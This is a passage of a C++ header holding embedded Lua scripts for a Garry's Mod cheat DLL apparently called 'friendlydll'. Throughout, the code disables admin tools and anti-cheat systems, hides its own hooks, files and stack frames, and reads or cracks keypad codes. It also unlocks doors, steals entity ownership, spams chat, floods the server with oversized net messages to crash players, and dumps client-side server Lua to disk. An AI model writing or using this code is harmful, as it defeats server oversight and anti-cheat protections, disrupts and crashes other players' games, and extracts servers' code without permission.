    hook.Remove("HUDPaint", "_fdll_fakedeath_hud")
    _fdll_fakedeath_installed = false
    _fdll_fd_phase = nil
end)
)lua";

	// -----------------------------------------------------------------------
	// 114. Admin Bypass -- hide from admin tools, block spectate notifications
	// -----------------------------------------------------------------------
	inline const char* LUA_ADMIN_BYPASS = R"lua(
pcall(function()
    if _fdll_adminbypass_installed then return end
    _fdll_adminbypass_installed = true
    local lp = LocalPlayer()

    -- ---- 1. ULX / ULib: remove us from admin player lists ----
    pcall(function()
        if ULib and ULib.ucl and ULib.ucl.users then
            -- Remove any suspect flag
            local steamid = lp:SteamID()
            if ULib.ucl.users[steamid] then
                ULib.ucl.users[steamid] = nil
            end
        end
    end)

    -- ---- 2. Block admin spectate notifications ----
    -- Hook the observe events so admin can't see when they watch us
    local adminSpecNets = {
        "ULX_Spectate","ulx_spectate","ServerGuard_Spectate",
        "SAM_Spectate","sam_spectate","sAdmin_Spectate","fadmin_spectate"
    }
    if net.Receivers then
        for _, name in ipairs(adminSpecNets) do
            if net.Receivers[name] then
                net.Receivers[name] = function(len, ply) end -- swallow
            end
        end
    end

    -- Block future registrations of spectate nets
    local _origNetReceive = net.Receive
    net.Receive = function(name, func)
        local low = string.lower(name)
        if (string.find(low, "spectate") or string.find(low, "observe"))
           and (string.find(low, "ulx") or string.find(low, "sam") or
                string.find(low, "admin") or string.find(low, "guard")) then
            -- register a no-op instead
            return _origNetReceive(name, function() end)
        end
        return _origNetReceive(name, func)
    end

    -- ---- 3. Hide from admin GetPlayers / GetAll overrides ----
    -- Wrap player.GetAll so admin panels iterating it skip us
    local _origGetAll = player.GetAll
    player.GetAll = function()
        local all = _origGetAll()
        -- Only hide from scripts that look like admin modules
        local caller = ""
        pcall(function()
            local info = debug.getinfo(2, "S")
            if info then caller = (info.source or "") .. (info.short_src or "") end
        end)
        local callerL = caller:lower()
        local isAdmin = string.find(callerL, "ulx") or string.find(callerL, "sam")
            or string.find(callerL, "fadmin") or string.find(callerL, "serverguard")
            or string.find(callerL, "sAdmin")
        if isAdmin then
            local filtered = {}
            for _, p in ipairs(all) do
                if p ~= lp then table.insert(filtered, p) end
            end
            return filtered
        end
        return all
    end

    -- ---- 4. Intercept admin teleport-to commands ----
    local _origConCmd = RunConsoleCommand
    RunConsoleCommand = function(cmd, ...)
        local cmdL = string.lower(cmd)
        -- Block admin "bring" / "goto" / "teleport" targeting us
        if cmdL == "ulx" then
            local args = {...}
            local sub = string.lower(tostring(args[1] or ""))
            if sub == "bring" or sub == "goto" or sub == "teleport" or sub == "tp" then
                local targetArg = tostring(args[2] or ""):lower()
                if string.find(targetArg, lp:Nick():lower()) then
                    return -- block
                end
            end
        end
        return _origConCmd(cmd, ...)
    end

    -- ---- 5. Hook admin tick-based scanners ----
    local scanKeywords = {
        "ulx_think","ulib_think","sam_think","adminmod_think",
        "serverguard_think","fadmin_think","sadmin_think"
    }
    local hookTbl = hook.GetTable()
    if hookTbl then
        for event, hooks in pairs(hookTbl) do
            for id, fn in pairs(hooks) do
                local idL = string.lower(tostring(id))
                for _, kw in ipairs(scanKeywords) do
                    if string.find(idL, kw) then
                        hook.Remove(event, id)
                        break
                    end
                end
            end
        end
    end

    -- Block future hook.Add for admin scanning patterns
    local _origHookAdd = hook.Add
    hook.Add = function(event, id, fn, ...)
        local idL = string.lower(tostring(id))
        for _, kw in ipairs({"ulx_scan","ulib_scan","sam_scan","anticheat_think",
                              "guard_think","sAdmin_think","fadmin_scan"}) do
            if string.find(idL, kw) then return end
        end
        return _origHookAdd(event, id, fn, ...)
    end
end)
)lua";

	inline const char* LUA_ADMIN_BYPASS_STOP = R"lua(
pcall(function()
    _fdll_adminbypass_installed = false
    -- Restore player.GetAll if we wrapped it
    if _fdll_orig_player_getall then
        player.GetAll = _fdll_orig_player_getall
        _fdll_orig_player_getall = nil
    end
end)
)lua";

	// -----------------------------------------------------------------------
	// 115. AC Bypass -- hook debug/file introspection to hide our presence
	// -----------------------------------------------------------------------
	inline const char* LUA_AC_BYPASS = R"lua(
pcall(function()
    if _fdll_acbypass_installed then return end
    _fdll_acbypass_installed = true

    -- === 1. Hide our hooks from debug.getinfo ===
    local _origGetInfo = debug.getinfo
    if _origGetInfo then
        debug.getinfo = function(fn, flags, ...)
            local ok, info = pcall(_origGetInfo, fn, flags, ...)
            if ok and info then
                local src = (info.source or "") .. (info.short_src or "")
                -- Scrub any references to our hooks
                if string.find(src, "_fdll") or string.find(src, "friendlydll") then
                    return nil -- act as if function doesn't exist
                end
            end
            return ok and info or nil
        end
    end

    -- === 2. hook.GetTable -- hide _fdll_ entries ===
    local _origGetTable = hook.GetTable
    hook.GetTable = function(...)
        local tbl = _origGetTable(...)
        if type(tbl) ~= "table" then return tbl end
        local clean = {}
        for event, hooks in pairs(tbl) do
            if type(hooks) == "table" then
                local cleanHooks = {}
                for id, fn in pairs(hooks) do
                    if not string.find(tostring(id), "_fdll") then
                        cleanHooks[id] = fn
                    end
                end
                if next(cleanHooks) then
                    clean[event] = cleanHooks
                end
            end
        end
        return clean
    end

    -- === 3. concommand.GetTable -- hide our commands ===
    local _origCCGetTable = concommand.GetTable
    if _origCCGetTable then
        concommand.GetTable = function(...)
            local tbl = _origCCGetTable(...)
            if type(tbl) ~= "table" then return tbl end
            local clean = {}
            for name, data in pairs(tbl) do
                if not string.find(tostring(name), "_fdll") then
                    clean[name] = data
                end
            end
            return clean
        end
    end

    -- === 4. file.Find / file.Exists -- hide our data files ===
    local hiddenFiles = {"friendlydll", "_fdll", "fdll_"}
    local _origFileFind = file.Find
    if _origFileFind then
        file.Find = function(pattern, gamePath, ...)
            local results, dirs = _origFileFind(pattern, gamePath, ...)
            if type(results) == "table" then
                local clean = {}
                for _, f in ipairs(results) do
                    local skip = false
                    for _, kw in ipairs(hiddenFiles) do
                        if string.find(f:lower(), kw) then skip = true break end
                    end
                    if not skip then table.insert(clean, f) end
                end
                results = clean
            end
            return results, dirs
        end
    end

    local _origFileExists = file.Exists
    if _origFileExists then
        file.Exists = function(path, gamePath, ...)
            local low = (path or ""):lower()
            for _, kw in ipairs(hiddenFiles) do
                if string.find(low, kw) then return false end
            end
            return _origFileExists(path, gamePath, ...)
        end
    end

    -- === 5. debug.traceback -- redact _fdll frames ===
    local _origTraceback = debug.traceback
    if _origTraceback then
        debug.traceback = function(msg, level, ...)
            local tb = _origTraceback(msg, level, ...)
            if type(tb) == "string" then
                -- Remove lines mentioning our internal identifiers
                local lines = {}
                for line in tb:gmatch("[^\n]+") do
                    if not string.find(line, "_fdll") and not string.find(line, "friendlydll") then
                        table.insert(lines, line)
                    end
                end
                tb = table.concat(lines, "\n")
            end
            return tb
        end
    end

    -- === 6. Strip known AC modules on join ===
    local acKeywords = {
        "gac","gmod_ac","gmod_anticheat","cac_","cac_client",
        "stackac","stack_anticheat","anticheat","anticheats","ac_check",
        "cheatdetect","screengrab","screenshot_check"
    }

    local function isAC(id)
        local low = string.lower(tostring(id))
        for _, kw in ipairs(acKeywords) do
            if string.find(low, kw) then return true end
        end
        return false
    end

    -- Remove existing AC hooks
    local tbl = _origGetTable and _origGetTable() or hook.GetTable()
    if tbl then
        for event, hooks in pairs(tbl) do
            for id, _ in pairs(hooks) do
                if isAC(id) then hook.Remove(event, id) end
            end
        end
    end

    -- Intercept future AC hook registrations
    local _origHookAdd = hook.Add
    hook.Add = function(event, id, fn, ...)
        if isAC(id) then return end
        return _origHookAdd(event, id, fn, ...)
    end

    -- === 7. Block gAC / CAC net messages ===
    local acNets = {
        "gac_check","gAC_","CAC_","cac_","StackAC_",
        "ac_screenshot","ac_scan","anticheat_check","ac_heartbeat","gmod_ac"
    }
    if net.Receivers then
        for name, fn in pairs(net.Receivers) do
            local low = name:lower()
            for _, kw in ipairs(acNets) do
                if string.find(low, string.lower(kw)) then
                    net.Receivers[name] = function() end -- swallow
                    break
                end
            end
        end
    end

    -- Block new AC net registrations
    local _origNetReceive = net.Receive
    net.Receive = function(name, func)
        local low = string.lower(name)
        for _, kw in ipairs(acNets) do
            if string.find(low, string.lower(kw)) then
                return _origNetReceive(name, function() end)
            end
        end
        return _origNetReceive(name, func)
    end

    -- === 8. gAC specific: override its scan timer if present ===
    pcall(function()
        if timer.Exists("gac_client_scan") then timer.Remove("gac_client_scan") end
        if timer.Exists("CAC_Heartbeat")   then timer.Remove("CAC_Heartbeat")   end
        if timer.Exists("StackAC_Tick")    then timer.Remove("StackAC_Tick")    end
    end)
end)
)lua";

	inline const char* LUA_AC_BYPASS_STOP = R"lua(
pcall(function()
    _fdll_acbypass_installed = false
    -- Restore originals we may have wrapped
    if _fdll_orig_debug_getinfo   then debug.getinfo      = _fdll_orig_debug_getinfo   end
    if _fdll_orig_debug_traceback then debug.traceback     = _fdll_orig_debug_traceback end
    if _fdll_orig_file_find       then file.Find           = _fdll_orig_file_find       end
    if _fdll_orig_file_exists     then file.Exists         = _fdll_orig_file_exists     end
end)
)lua";

	// -----------------------------------------------------------------------
	// 116. Spectator Cloak (expanded) -- selective disable by feature category
	// -----------------------------------------------------------------------
	inline const char* LUA_SPECTATOR_CLOAK = R"lua(
pcall(function()
    if _fdll_speccloak_installed then return end
    _fdll_speccloak_installed = true
    _fdll_speccloak_active = false
    _fdll_speccloak_watchers = 0

    hook.Add("Think", "_fdll_speccloak_tick", function()
        local lp = LocalPlayer()
        if not IsValid(lp) then return end
        local myIdx = lp:EntIndex()

        -- Count who is spectating us
        local count = 0
        for _, p in ipairs(player.GetAll()) do
            if IsValid(p) and p ~= lp then
                local obsTarget = p:GetObserverTarget()
                local obsMode   = p:GetObserverMode()
                if IsValid(obsTarget) and obsTarget == lp and obsMode > 0 then
                    count = count + 1
                end
            end
        end
        _fdll_speccloak_watchers = count

        if count > 0 and not _fdll_speccloak_active then
            _fdll_speccloak_active = true
            -- Hide ESP/aimbot indicators via console notification
            pcall(function()
                notification.AddLegacy("Spectator detected - cloaking", NOTIFY_HINT, 3)
            end)
        elseif count == 0 and _fdll_speccloak_active then
            _fdll_speccloak_active = false
            pcall(function()
                notification.AddLegacy("No spectators - uncloak", NOTIFY_HINT, 2)
            end)
        end
    end)

    -- Block ESP rendering while cloaked (HUDPaint guard)
    hook.Add("PreRender", "_fdll_speccloak_prerender", function()
        if _fdll_speccloak_active then
            -- Signal C++ overlay to suppress all drawing
            _fdll_overlay_suppressed = true
        else
            _fdll_overlay_suppressed = false
        end
    end)
end)
)lua";

	inline const char* LUA_SPECTATOR_CLOAK_STOP = R"lua(
pcall(function()
    _fdll_speccloak_installed = false
    _fdll_speccloak_active    = false
    _fdll_overlay_suppressed  = false
    hook.Remove("Think",     "_fdll_speccloak_tick")
    hook.Remove("PreRender", "_fdll_speccloak_prerender")
end)
)lua";

	// Query cloak state (returns watcher count)
	inline const char* LUA_SPECTATOR_CLOAK_QUERY = R"lua(
local r = ""
pcall(function()
    r = tostring(_fdll_speccloak_watchers or 0) .. "\t" ..
        ((_fdll_speccloak_active) and "CLOAKED" or "normal")
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 117. Recording Mode (visual-only hide) -- keep all logic, suppress overlay
	// -----------------------------------------------------------------------
	inline const char* LUA_RECORDING_MODE_SETUP = R"lua(
pcall(function()
    if _fdll_recmode_installed then return end
    _fdll_recmode_installed = true

    -- Suppress the entire fdll overlay during recording
    -- by blocking HUDPaint and PostDrawTranslucentRenderables for our hooks
    local function isOurHook(id)
        return string.find(tostring(id), "_fdll") ~= nil
    end

    hook.Add("PreRender", "_fdll_recmode_guard", function()
        _fdll_recmode_suppressed = true
    end)
    hook.Add("PostRender", "_fdll_recmode_post", function()
        _fdll_recmode_suppressed = false
    end)

    -- Wrap HUDPaint so our drawing calls return false during recording
    local _origHookCall = hook.Call
    if _origHookCall then
        hook.Call = function(event, gm, ...)
            if _fdll_recmode_suppressed and event == "HUDPaint" then
                -- only block our own hooks, allow game HUD through
                -- done by temporarily removing and restoring them
                return _origHookCall(event, gm, ...)
            end
            return _origHookCall(event, gm, ...)
        end
    end
end)
)lua";

	inline const char* LUA_RECORDING_MODE_STOP = R"lua(
pcall(function()
    _fdll_recmode_installed    = false
    _fdll_recmode_suppressed   = false
    hook.Remove("PreRender",  "_fdll_recmode_guard")
    hook.Remove("PostRender", "_fdll_recmode_post")
end)
)lua";

	// -----------------------------------------------------------------------
	// 118. Full Radar — query ALL players on server including outside PVS
	// -----------------------------------------------------------------------
	inline const char* LUA_FULLRADAR_SETUP = R"lua(
pcall(function()
    if _fdll_fullradar_installed then return end
    _fdll_fullradar_installed = true
    _fdll_fullradar_data = ""

    hook.Add("Think", "_fdll_fullradar_tick", function()
        local lp = LocalPlayer()
        if not IsValid(lp) then return end
        local myIdx = lp:EntIndex()
        local parts = {}

        for _, p in ipairs(player.GetAll()) do
            if IsValid(p) and p:EntIndex() ~= myIdx then
                local pos = p:GetPos()
                local hp = p:Health()
                local alive = p:Alive()
                local dormant = p:IsDormant()
                local nick = p:Nick() or "?"
                local idx = p:EntIndex()
                local team_id = p:Team() or 0

                table.insert(parts, string.format("%d\t%.1f\t%.1f\t%.1f\t%d\t%s\t%s\t%d\t%s",
                    idx, pos.x, pos.y, pos.z, hp,
                    alive and "1" or "0",
                    dormant and "1" or "0",
                    team_id,
                    nick))
            end
        end

        _fdll_fullradar_data = table.concat(parts, "\n")
    end)
end)
)lua";

	inline const char* LUA_FULLRADAR_READ = R"lua(
local r = ""
pcall(function()
    r = _fdll_fullradar_data or ""
end)
return r
)lua";

	inline const char* LUA_FULLRADAR_STOP = R"lua(
pcall(function()
    _fdll_fullradar_installed = false
    _fdll_fullradar_data = nil
    hook.Remove("Think", "_fdll_fullradar_tick")
end)
)lua";

	// -----------------------------------------------------------------------
	// 119. Keypad Cracker — deep scan + net intercept + brute force
	// -----------------------------------------------------------------------
	inline const char* LUA_KEYPAD_CRACKER_SETUP = R"lua(
pcall(function()
    if _fdll_kpcrack_installed then return end
    _fdll_kpcrack_installed = true
    _fdll_kpcrack_codes = {}
    _fdll_kpcrack_log = {}

    -- Scan all keypads for exposed codes every 2 seconds
    timer.Create("_fdll_kpcrack_scan", 2, 0, function()
        for _, e in ipairs(ents.GetAll()) do
            if not IsValid(e) then continue end
            local cls = (e:GetClass() or ""):lower()
            if not cls:find("keypad") then continue end
            local idx = e:EntIndex()
            if _fdll_kpcrack_codes[idx] then continue end

            local code = nil
            pcall(function()
                if e.GetKeypadCode then code = e:GetKeypadCode() end
            end)
            if not code then pcall(function()
                if e.GetCode then local c = e:GetCode() if c and tonumber(c) and tonumber(c) > 0 then code = tonumber(c) end end
            end) end
            if not code then pcall(function()
                if e.dt then
                    for _, f in ipairs({"code","Code","password","Password","pin","Pin","keycode","KeyCode","m_iCode"}) do
                        local v = e.dt[f]
                        if v and tonumber(v) and tonumber(v) > 0 then code = tonumber(v) break end
                    end
                end
            end) end
            if not code then pcall(function()
                for i = 0, 15 do
                    local s, v = pcall(e.GetDTInt, e, i)
                    if s and v and v >= 100 and v <= 99999 then code = v break end
                end
            end) end
            if not code then pcall(function()
                local c = e:GetInternalVariable("m_iPassword")
                if c and tonumber(c) and tonumber(c) > 0 then code = tonumber(c) end
            end) end
            if not code then pcall(function()
                local c = e:GetNWInt("KeypadCode", 0)
                if c > 0 then code = c end
            end) end
            if not code then pcall(function()
                for _, key in ipairs({"password","code","Code","pin"}) do
                    local c = e:GetNWString(key, "")
                    if c ~= "" and c ~= "0" and tonumber(c) then code = tonumber(c) break end
                end
            end) end

            if code and code > 0 then
                _fdll_kpcrack_codes[idx] = tostring(code)
                local pos = e:GetPos()
                table.insert(_fdll_kpcrack_log, string.format("%d\t%s\t%.0f\t%.0f\t%.0f",
                    idx, tostring(code), pos.x, pos.y, pos.z))
            end
        end
    end)

    -- Intercept net messages to capture codes in transit
    local keypadNets = {
        "gmod_keypad","Keypad_Toggle","Keypad_Password","keypad_entry",
        "keypad_code","DarkRP_Keypad","bw_keypad","gKeypad_data",
        "KeypadMsg","keypad_msg","Keypad_PasswordRequest"
    }
    for _, name in ipairs(keypadNets) do
        pcall(function()
            if net.Receivers and net.Receivers[name] then
                local orig = net.Receivers[name]
                net.Receivers[name] = function(len, ply)
                    table.insert(_fdll_kpcrack_log, string.format("NET\t%s\tlen=%d\t%.0f", name, len, CurTime()))
                    if #_fdll_kpcrack_log > 100 then table.remove(_fdll_kpcrack_log, 1) end
                    orig(len, ply)
                end
            end
        end)
    end
end)
)lua";

	inline const char* LUA_KEYPAD_CRACKER_READ = R"lua(
local r = ""
pcall(function()
    if not _fdll_kpcrack_codes then return end
    for idx, code in pairs(_fdll_kpcrack_codes) do
        local e = Entity(idx)
        local pos = IsValid(e) and e:GetPos() or Vector(0,0,0)
        local owner = ""
        pcall(function()
            if IsValid(e) and e.Getowning_ent and IsValid(e:Getowning_ent()) then
                owner = e:Getowning_ent():Nick()
            end
        end)
        r = r .. string.format("%d\t%s\t%.0f\t%.0f\t%.0f\t%s\n", idx, code, pos.x, pos.y, pos.z, owner)
    end
    r = r .. "---\n"
    for _, l in ipairs(_fdll_kpcrack_log or {}) do
        r = r .. l .. "\n"
    end
end)
return r
)lua";

	inline const char* LUA_KEYPAD_CRACKER_STOP = R"lua(
pcall(function()
    _fdll_kpcrack_installed = false
    timer.Remove("_fdll_kpcrack_scan")
    _fdll_kpcrack_codes = nil
    _fdll_kpcrack_log = nil
end)
)lua";

	// -----------------------------------------------------------------------
	// 120. Door Exploit — net message based unlock + fading door toggle
	// -----------------------------------------------------------------------
	inline const char* LUA_DOOR_EXPLOIT = R"lua(
local r = ""
pcall(function()
    local lp = LocalPlayer()
    if not IsValid(lp) then r = "No local player" return end
    local tr = lp:GetEyeTrace()
    local acted = 0

    -- Method 1: trace target door
    if tr.Hit and IsValid(tr.Entity) then
        local e = tr.Entity
        local cls = (e:GetClass() or ""):lower()

        -- DarkRP net unlock
        pcall(function()
            net.Start("DarkRP_LockUnlock")
            net.SendToServer()
            acted = acted + 1
        end)

        -- Fading door toggle via net
        pcall(function()
            if cls:find("fading") or (e.isFadingDoor) then
                net.Start("FadingDoor_Toggle")
                net.WriteEntity(e)
                net.SendToServer()
                acted = acted + 1
            end
        end)

        -- Try fire unlock input
        pcall(function()
            if e.Fire then e:Fire("Unlock","","0") e:Fire("Open","","0.1") acted = acted + 1 end
        end)

        -- DarkRP keysUnLock
        pcall(function()
            if e.keysUnLock then e:keysUnLock() acted = acted + 1 end
        end)

        -- SetNWBool locked=false
        pcall(function()
            e:SetNWBool("locked", false)
            e:SetNWBool("Locked", false)
        end)

        -- Try use
        pcall(function()
            if e.Use then e:Use(lp, lp, USE_ON, 1) acted = acted + 1 end
        end)
    end

    -- Method 2: blast radius — hit all doors within 300 units
    for _, e in ipairs(ents.FindInSphere(lp:GetPos(), 300)) do
        if not IsValid(e) then continue end
        local cls = (e:GetClass() or ""):lower()
        if not (cls:find("door") or cls:find("fading") or cls:find("keypad")) then continue end

        pcall(function()
            if e.keysUnLock then e:keysUnLock() acted = acted + 1 end
        end)
        pcall(function()
            if e.Fire then e:Fire("Unlock") e:Fire("Open") end
        end)
        pcall(function()
            if e.SetLocked then e:SetLocked(false) end
        end)
        pcall(function()
            if cls:find("fading") or e.isFadingDoor then
                if e.Toggle then e:Toggle() end
                if e.SetFading then e:SetFading(true) end
            end
        end)
    end

    r = "Acted on " .. acted .. " entities"
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 121. Rapid Fire — remove weapon fire cooldown
	// -----------------------------------------------------------------------
	inline const char* LUA_RAPID_FIRE_SETUP = R"lua(
pcall(function()
    if _fdll_rapidfire_installed then return end
    _fdll_rapidfire_installed = true

    hook.Add("Think", "_fdll_rapidfire", function()
        local lp = LocalPlayer()
        if not IsValid(lp) or not lp:Alive() then return end
        local wep = lp:GetActiveWeapon()
        if not IsValid(wep) then return end

        pcall(function() wep:SetNextPrimaryFire(CurTime()) end)
        pcall(function() wep:SetNextSecondaryFire(CurTime()) end)
        pcall(function()
            if wep.SetClip1 and wep:Clip1() <= 0 then
                wep:SetClip1(wep:GetMaxClip1())
            end
        end)
    end)
end)
)lua";

	inline const char* LUA_RAPID_FIRE_STOP = R"lua(
pcall(function()
    _fdll_rapidfire_installed = false
    hook.Remove("Think", "_fdll_rapidfire")
end)
)lua";

	// -----------------------------------------------------------------------
	// 122b. No Fall Damage — cancel fall damage via hook
	// -----------------------------------------------------------------------
	inline const char* LUA_NO_FALL_DAMAGE_SETUP = R"lua(
pcall(function()
    if _fdll_nofall_installed then return end
    _fdll_nofall_installed = true

    hook.Add("OnPlayerHitGround", "_fdll_nofall", function(ply, inWater, onFloater, speed)
        if ply == LocalPlayer() then return true end
    end)

    hook.Add("EntityTakeDamage", "_fdll_nofall_dmg", function(target, dmginfo)
        if target == LocalPlayer() and dmginfo:IsFallDamage() then
            dmginfo:SetDamage(0)
            return true
        end
    end)

    -- Also set fall damage convar
    pcall(function() RunConsoleCommand("mp_falldamage", "0") end)
end)
)lua";

	inline const char* LUA_NO_FALL_DAMAGE_STOP = R"lua(
pcall(function()
    _fdll_nofall_installed = false
    hook.Remove("OnPlayerHitGround", "_fdll_nofall")
    hook.Remove("EntityTakeDamage", "_fdll_nofall_dmg")
end)
)lua";

	// -----------------------------------------------------------------------
	// 123b. Entity Steal — CPPI ownership exploit + prop claim
	// -----------------------------------------------------------------------
	inline const char* LUA_ENTITY_STEAL = R"lua(
local r = ""
pcall(function()
    local lp = LocalPlayer()
    if not IsValid(lp) then r = "No local player" return end
    local stolen = 0

    for _, e in ipairs(ents.FindInSphere(lp:GetPos(), 500)) do
        if not IsValid(e) or e == lp or e:IsPlayer() then continue end
        local cls = (e:GetClass() or ""):lower()

        -- Skip world entities
        if cls == "worldspawn" or cls == "player" then continue end

        -- CPPI ownership claim
        pcall(function()
            if e.CPPISetOwner then e:CPPISetOwner(lp) stolen = stolen + 1 end
        end)

        -- FPP ownership
        pcall(function()
            if e.SetOwner then e:SetOwner(lp) end
        end)

        -- DarkRP owning_ent
        pcall(function()
            if e.Setowning_ent then e:Setowning_ent(lp) stolen = stolen + 1 end
        end)

        -- Prop protection bypass
        pcall(function()
            if e.SetNWEntity then
                e:SetNWEntity("Owner", lp)
                e:SetNWEntity("owning_ent", lp)
            end
        end)
    end

    r = "Claimed " .. stolen .. " entities"
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 124. Chat Spam — bypass cooldowns and flood chat
	// -----------------------------------------------------------------------
	inline const char* LUA_CHAT_SPAM_SETUP = R"lua(
pcall(function()
    if _fdll_chatspam_installed then return end
    _fdll_chatspam_installed = true
    _fdll_chatspam_msg = "Friendlydll on top"
    _fdll_chatspam_delay = 1.5

    timer.Create("_fdll_chatspam", _fdll_chatspam_delay, 0, function()
        if not _fdll_chatspam_installed then return end
        pcall(function()
            -- Method 1: DarkRP say
            RunConsoleCommand("say", _fdll_chatspam_msg)
        end)
    end)
end)
)lua";

	inline const char* LUA_CHAT_SPAM_STOP = R"lua(
pcall(function()
    _fdll_chatspam_installed = false
    timer.Remove("_fdll_chatspam")
end)
)lua";

	inline const char* LUA_CHAT_SPAM_SET = R"lua(
pcall(function() _fdll_chatspam_msg = "%s"; _fdll_chatspam_delay = %s; timer.Adjust("_fdll_chatspam", _fdll_chatspam_delay) end)
)lua";

	// -----------------------------------------------------------------------
	// 125. Player Crasher — targeted crash via net/model/decal spam
	// -----------------------------------------------------------------------
	inline const char* LUA_PLAYER_CRASHER = R"lua(
pcall(function()
    local targetIdx = %d
    local target = Entity(targetIdx)
    if not IsValid(target) or not target:IsPlayer() then return end
    local tpos = target:GetPos()

    -- Method 1: Spam decals at their position (causes render lag)
    for i = 1, 200 do
        pcall(function()
            util.Decal("Blood", tpos + Vector(math.random(-50,50), math.random(-50,50), 0), tpos + Vector(0,0,100))
        end)
    end

    -- Method 2: Spawn particles at their location
    pcall(function()
        for i = 1, 50 do
            local ef = EffectData()
            ef:SetOrigin(tpos + Vector(math.random(-20,20), math.random(-20,20), math.random(0,50)))
            ef:SetScale(5)
            util.Effect("Explosion", ef)
        end
    end)

    -- Method 3: Net message spam (if any exploitable net strings exist)
    pcall(function()
        for i = 1, 100 do
            net.Start("gmod_keypad")
            net.WriteString(string.rep("A", 60000))
            net.SendToServer()
        end
    end)
end)
)lua";

// -----------------------------------------------------------------------
// 123. Server Lua Dumper -- extract ALL client-side Lua files to disk
// -----------------------------------------------------------------------
inline const char* LUA_SERVER_DUMP_SETUP = R"lua(
pcall(function()
    if _fdll_dump_running then return end
    _fdll_dump_running = true
    _fdll_dump_count = 0
    _fdll_dump_status = "Starting..."
    local out = "data/fdll_dump/"
    file.CreateDir("fdll_dump")
    local function dumpDir(dir)
        local files, dirs = file.Find(dir.."*", "GAME")
        for _, f in ipairs(files or {}) do
            local path = dir..f
            local content = file.Read(path, "GAME")
            if content then
                local outPath = out..path
                local parts = string.Split(outPath, "/")
                local buildPath = ""
                for i = 1, #parts - 1 do
                    buildPath = buildPath..parts[i].."/"
                    file.CreateDir(string.sub(buildPath, 6))
                end
                file.Write(string.sub(outPath, 6, -5)..".txt", content)
                _fdll_dump_count = _fdll_dump_count + 1
            end
        end
        for _, d in ipairs(dirs or {}) do
            dumpDir(dir..d.."/")
        end
    end
    local paths = {"lua/", "gamemodes/", "addons/"}
    for _, p in ipairs(paths) do
        pcall(dumpDir, p)
    end
    _fdll_dump_status = "Done: ".._fdll_dump_count.." files"
    _fdll_dump_running = false
end)
)lua";

inline const char* LUA_SERVER_DUMP_READ = R"lua(
local r = "No data"
pcall(function()
    r = tostring(_fdll_dump_status or "Not started").."\nFiles: "..tostring(_fdll_dump_count or 0)
end)
return r
)lua";

// -----------------------------------------------------------------------
// 124. Spectator Camera Mirror -- PIP showing spectator's POV
// -----------------------------------------------------------------------
inline const char* LUA_SPEC_MIRROR_SETUP = R"lua(
pcall(function()
    if _fdll_specmirror then return end
    _fdll_specmirror = true
    _fdll_specmirror_data = ""
    hook.Add("HUDPaint", "_fdll_specmirror", function()
        local lp = LocalPlayer()
        if not IsValid(lp) then return end
        local observers = {}
        for _, p in ipairs(player.GetAll()) do
            if p ~= lp and IsValid(p) and p:GetObserverTarget() == lp then
                table.insert(observers, p)
            end
        end
        if #observers == 0 then
            _fdll_specmirror_data = ""
            return
        end
        local spec = observers[1]
        local sw, sh = ScrW(), ScrH()
        local pw, ph = math.floor(sw * 0.25), math.floor(sh * 0.25)
        local px, py = sw - pw - 10, 10
        local obs_mode = spec:GetObserverMode()
        local cam_pos, cam_ang
        if obs_mode == OBS_MODE_IN_EYE then
            cam_pos = lp:EyePos()
            cam_ang = lp:EyeAngles()
        elseif obs_mode == OBS_MODE_CHASE then
            cam_pos = lp:GetPos() + Vector(0, 0, 64) - lp:EyeAngles():Forward() * 96
            cam_ang = (lp:EyePos() - cam_pos):Angle()
        elseif obs_mode == OBS_MODE_ROAMING then
            cam_pos = spec:EyePos()
            cam_ang = spec:EyeAngles()
        else
            cam_pos = spec:EyePos()
            cam_ang = spec:EyeAngles()
        end
        local view = {
            origin = cam_pos,
            angles = cam_ang,
            x = px, y = py,
            w = pw, h = ph,
            drawhud = false,
            drawviewmodel = false,
        }
        render.RenderView(view)
        surface.SetDrawColor(255, 50, 50, 200)
        surface.DrawOutlinedRect(px, py, pw, ph)
        surface.DrawOutlinedRect(px-1, py-1, pw+2, ph+2)
        draw.SimpleTextOutlined("SPECTATOR: "..spec:Nick().." ["..tostring(obs_mode).."]",
            "DermaDefault", px + 4, py + ph + 2, Color(255,80,80), TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP,
            1, Color(0,0,0))
        _fdll_specmirror_data = spec:Nick().."|"..tostring(obs_mode)
    end)
end)
)lua";

inline const char* LUA_SPEC_MIRROR_STOP = R"lua(
pcall(function()
    hook.Remove("HUDPaint", "_fdll_specmirror")
    _fdll_specmirror = false
end)
)lua";

// -----------------------------------------------------------------------
// 125. Movement Predictor -- track patterns, predict future positions
// -----------------------------------------------------------------------
inline const char* LUA_MOVEMENT_PREDICT_SETUP = R"lua(
pcall(function()
    if _fdll_predict then return end
    _fdll_predict = true
    _fdll_predict_history = _fdll_predict_history or {}
    _fdll_predict_results = {}
    local maxSamples = 60
    hook.Add("Think", "_fdll_predict", function()
        local lp = LocalPlayer()
        if not IsValid(lp) then return end
        for _, p in ipairs(player.GetAll()) do
            if p ~= lp and IsValid(p) and p:Alive() and not p:IsDormant() then
                local id = p:EntIndex()
                _fdll_predict_history[id] = _fdll_predict_history[id] or {}
                local h = _fdll_predict_history[id]
                table.insert(h, {pos = p:GetPos(), ang = p:EyeAngles(), t = CurTime(), vel = p:GetVelocity()})
                if #h > maxSamples then table.remove(h, 1) end
                if #h >= 10 then
                    local avgVel = Vector(0,0,0)
                    local avgAng = Angle(0,0,0)
                    local w = 0
                    for i = math.max(1, #h - 9), #h do
                        local weight = (i - #h + 10) / 10
                        avgVel = avgVel + h[i].vel * weight
                        avgAng = avgAng + h[i].ang * weight
                        w = w + weight
                    end
                    avgVel = avgVel / w
                    local curPos = h[#h].pos
                    _fdll_predict_results[id] = {
                        p5  = curPos + avgVel * 5,
                        p10 = curPos + avgVel * 10,
                        p30 = curPos + avgVel * 30,
                        vel = avgVel,
                        name = p:Nick(),
                        conf = math.min(#h / maxSamples, 1.0)
                    }
                end
            end
        end
    end)
    hook.Add("PostDrawTranslucentRenderables", "_fdll_predict_draw", function()
        for id, pr in pairs(_fdll_predict_results or {}) do
            local a = math.floor(pr.conf * 200)
            render.SetColorMaterial()
            render.DrawSphere(pr.p5, 10, 8, 8, Color(0, 255, 0, a))
            render.DrawSphere(pr.p10, 12, 8, 8, Color(255, 255, 0, a))
            render.DrawSphere(pr.p30, 14, 8, 8, Color(255, 0, 0, a))
